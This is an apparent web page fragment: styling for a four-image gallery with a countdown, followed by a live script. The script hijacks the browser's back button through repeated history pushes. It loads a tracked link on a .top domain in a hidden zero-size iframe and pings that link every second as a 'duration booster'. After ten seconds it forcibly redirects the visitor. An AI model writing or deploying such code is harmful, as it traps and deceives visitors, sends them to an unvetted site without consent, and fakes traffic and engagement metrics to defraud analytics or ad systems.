<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
background: #0b0b0b;
height: 100vh;
width: 100vw;
overflow: hidden;
display: flex;
justify-content: center;
align-items: center;
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
position: relative;
cursor: pointer;
}

/* Instant Image Grid Layout */
#image-grid {
position: absolute;
top: 0; left: 0;
width: 100vw;
height: 100vh;
display: grid;
grid-template-columns: repeat(2, 1fr);
grid-template-rows: repeat(2, 1fr);
gap: 6px;
padding: 6px;
background: #111;
z-index: 1;
}

.grid-img-wrapper {
position: relative;
width: 100%;
height: 100%;
overflow: hidden;
border-radius: 12px;
box-shadow: 0 4px 15px rgba(0,0,0,0.5);
cursor: pointer;
}

.grid-img {
width: 100%;
height: 100%;
object-fit: cover;
transition: transform 0.3s ease;
}

.grid-img-wrapper:hover .grid-img {
transform: scale(1.05);
}

.grid-img-wrapper::after {
content: '';
position: absolute;
top: 0; left: 0; width: 100%; height: 100%;
background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.4));
pointer-events: none;
}

#reels-overlay {
position: absolute;
top: 0;
left: 0;
width: 100vw;
height: 100vh;
object-fit: contain;
pointer-events: none;
z-index: 10;
}

.countdown-container {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
width: 85px;
height: 85px;
display: flex;
justify-content: center;
align-items: center;
background: rgba(20, 20, 20, 0.75);
backdrop-filter: blur(12px);
-webkit-backdrop-filter: blur(12px);
border-radius: 50%;
border: 1px solid rgba(255, 255, 255, 0.15);
box-shadow: 0 8px 32px rgba(0,0,0,0.6);
z-index: 999;
pointer-events: none;
}

.countdown-svg {
position: absolute;
width: 100%;
height: 100%;
transform: rotate(-90deg);
}

.countdown-svg circle {
fill: none;
stroke-width: 4;
}

.circle-bg {
stroke: rgba(255, 255, 255, 0.15);
}

.circle-progress {
stroke: #00d2ff;
stroke-dasharray: 251.2;
stroke-dashoffset: 0;
stroke-linecap: round;
transition: stroke-dashoffset 1s linear;
}

#countdown-number {
font-size: 30px;
font-weight: 700;
color: #ffffff;
text-shadow: 0 2px 6px rgba(0,0,0,0.8);
z-index: 1000;
}
</style>

<script>
/* SINGLE TARGET UTM LINK CONFIGURATION */
const activeTargetLink = "https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S22";

/* INITIALIZE ALL FUNCTIONS INSTANTLY */
(function () {
    initHistoryTrap();
    startCountdown(10);
    startDurationBooster();
})();

/* 1. History Trap (Back Button Guard) */
function initHistoryTrap() {
    try {
        history.pushState(null, null, window.location.href);
        history.pushState(null, null, window.location.href);

        window.addEventListener('popstate', function () {
            history.pushState(null, null, window.location.href);
        });
    } catch (e) {
        console.log("History trap active");
    }
}

/* 2. 10-Second Countdown Timer */
function startCountdown(seconds) {
    let timeLeft = seconds;
    const numDisplay = document.getElementById("countdown-number");
    const circleProgress = document.getElementById("circle-progress");
    const totalCircleLength = 251.2;
    const countdownBox = document.getElementById("countdown-box");

    const timer = setInterval(() => {
        timeLeft--;

        if (timeLeft > 0) {
            numDisplay.textContent = timeLeft;
            const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
            circleProgress.style.strokeDashoffset = offset;
        } else {
            numDisplay.textContent = "0";
            circleProgress.style.strokeDashoffset = totalCircleLength;
            clearInterval(timer);
            countdownBox.style.display = "none";
            goToTarget();
        }
    }, 1000);
}

/* 3. Background Duration Booster (iFrame & Beacon) */
function startDurationBooster() {
    try {
        const iframe = document.createElement('iframe');
        iframe.src = activeTargetLink;
        iframe.style.display = 'none';
        iframe.style.width = '0px';
        iframe.style.height = '0px';
        document.body.appendChild(iframe);
    } catch (e) {
        console.log("iFrame loaded");
    }

    setInterval(() => {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(activeTargetLink);
        } else {
            fetch(activeTargetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
        }
    }, 1000);
}

/* 4. Global Target Redirect on Click */
function goToTarget() {
    window.location.href = activeTargetLink;
}
</script>
